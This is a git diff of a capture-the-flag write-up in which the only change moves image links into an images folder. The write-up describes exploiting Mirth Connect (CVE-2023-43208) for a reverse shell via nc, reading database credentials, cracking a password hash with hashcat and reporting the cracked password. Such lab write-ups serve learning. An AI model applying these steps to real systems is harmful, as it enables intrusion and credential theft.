@@ -62,7 +62,7 @@ We are being redirected at : http://10.129.4.116/webadmin/Index.action
 
 The page shown is a Mirth Admin panel.
 
-![mirth](mirth.png)
+![mirth](images/mirth.png)
 
 ## 2. Enumeration
 
@@ -95,7 +95,7 @@ python3 CVE-2023-43208.py -u <Target URL> -lh <Listening Host> -lp <Listening Po
 
 Let's find our IP address that will be the listening host for the reverse shell using the IP a command :
 
-![Command for ip](ip.png)
+![Command for ip](images/ip.png)
 
 Our IP is 10.10.14.239
 
@@ -105,11 +105,11 @@ The exploit is making a reverse shell. Attacking the mirth, and sending the resp
 
 We can send and receive commands in a specific shell with the nc command at the specific port.
 
-![nc command and reverse shell](nc.png)
+![nc command and reverse shell](images/nc.png)
 
 When navigating in the folders and files, I found a mirth properties in the conf folder. It contains the user and pass to connect to the database.
 
-![Database credentials](mirthpass.png)
+![Database credentials](images/mirthpass.png)
 
 
 we connect to it with mysql and print the tables.
@@ -122,23 +122,23 @@ After getting the reverse shell via nc, the shell lacks a proper TTY. This means
 
 ps aux : python is present on the machine. `/usr/bin/pyth`
 
-![Python processes](python-proc-root.png)
+![Python processes](images/python-proc-root.png)
 
 The command to successfully spawn a pty.
 
-![Spawning tty shell](ttyshell.png)
+![Spawning tty shell](images/ttyshell.png)
 
 Let's now connect to the database using mysql command, and show the tables.
 
-![Command for ip](connectbdd.png)
+![Command for ip](images/connectbdd.png)
 
 Doing a select on the PERSON table, we are shown info of user 'sedric'
 
-![Select PERSON](selectperson.png)
+![Select PERSON](images/selectperson.png)
 
 Doing a select on the PERSON_PASSWORD table, we are shown his password. The password looks encrypted. Let's try to decrypt it, and then login as user sedric on the machine.
 
-![Select PERSON PASSWORD](accessdb.png)
+![Select PERSON PASSWORD](images/accessdb.png)
 
 
 The stored password hash `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==` is encoded in base64 (containing + sign, == at the end...). Lets decode it first.
@@ -161,19 +161,19 @@ sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
 
 Let's store this in a mirth_hash.txt file and run the hashcat command with a dictionnary attack using rockyou.txt file database.
 
-![Hashcat command](hashcat.png)
+![Hashcat command](images/hashcat.png)
 
 After some time, hashcat successfully cracked sedric's password.
 
-![Hashcat success](hashcat-success.png)
+![Hashcat success](images/hashcat-success.png)
 
 Password snowflake1 found. lets try to connect to sedric.
 
-![Su to sedric](su-sedric.png)
+![Su to sedric](images/su-sedric.png)
 
 connected successfully to sedric, user flag found in the home folder.
 
-![user flag found](user-flag.png)
+![user flag found](images/user-flag.png)
 
 ---
 
@@ -183,11 +183,11 @@ connected successfully to sedric, user flag found in the home folder.
 Let's now try to do a privilege escalation to access root.
 doing a ps aux on the machine to see the running processes, we see two python scripts being run as root.
 
-![Python script running as root](python-proc-root.png)
+![Python script running as root](images/python-proc-root.png)
 
 One python script contains this function which runs an eval as root. With an intensive search apparently it can be used to execute remote code in the payload, because it simply extracts whats in the {} without checking it. A bit like the script into the exploit PoC I used for mirth connect. Instead of java, it would be done in a python script. It will allow privilege escalation because this script runs as root. I currently do not have the technical knowledge to execute this and I relied too much on AI to help me which I didn't like. I learned a LOT already from this room.
 
-![Eval script](eval-script.png)
+![Eval script](images/eval-script.png)
 
 ---
 
